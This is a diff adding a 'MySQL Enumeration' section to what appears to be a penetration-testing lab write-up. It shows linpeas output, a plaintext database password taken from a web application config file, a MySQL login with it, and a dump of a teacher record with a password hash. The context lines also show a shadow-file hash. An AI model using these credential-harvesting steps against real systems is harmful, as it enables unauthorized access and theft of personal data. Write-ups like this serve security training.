@@ -1986,6 +1986,84 @@ whoami
 root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::                                                                                                              vcsa:!!:15422:0:99999:7:::
 pcap:!!:15422:0:99999:7:::
 ````
+### MySQL Enumeration
+#### Linpeas
+````
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                              
+tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*                                                                                                                                                                       
+tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*            
+tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*            
+tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
+tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*    
+````
+````
+╔══════════╣ Analyzing Backup Manager Files (limit 70)
+                                                                                                                                                                                                                                           
+-rw-r--r-- 1 www-data www-data 3896 Mar 31 07:56 /var/www/html/management/application/config/database.php
+|       ['password'] The password used to connect to the database
+|       ['database'] The name of the database you want to connect to
+        'password' => '@jCma4s8ZM<?kA',
+        'database' => 'school_mgment',
+
+````
+#### MySQL login
+````
+<cation/config$ mysql -u 'school' -p 'school_mgment'         
+Enter password: @jCma4s8ZM<?kA
+````
+````
+mysql> show databases;
+mysql> show tables;
+````
+````
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| school_mgment      |
+| sys                |
++--------------------+
+5 rows in set (0.00 sec)
+````
+````
+mysql> select * from teacher\G
+
+select * from teacher\G
+*************************** 1. row ***************************
+     teacher_id: 1
+           name: Testing Teacher
+           role: 1
+ teacher_number: f82e5cc
+       birthday: 2018-08-19
+            sex: male
+       religion: Christianity
+    blood_group: B+
+        address: 546787, Kertz shopping complext, Silicon Valley, United State of America, New York city.
+          phone: +912345667
+          email: michael_sander@school.pg
+       facebook: facebook
+        twitter: twitter
+     googleplus: googleplus
+       linkedin: linkedin
+  qualification: PhD
+ marital_status: Married
+      file_name: profile.png
+       password: 3db12170ff3e811db10a76eadd9e9986e3c1a5b7
+  department_id: 2
+ designation_id: 4
+date_of_joining: 2019-09-15
+ joining_salary: 5000
+         status: 1
+date_of_leaving: 2019-09-18
+        bank_id: 3
+   login_status: 0
+1 row in set (0.00 sec)
+````
 ### MySQL User Defined Functions
 ````
 port 0.0.0.0:3306 open internally
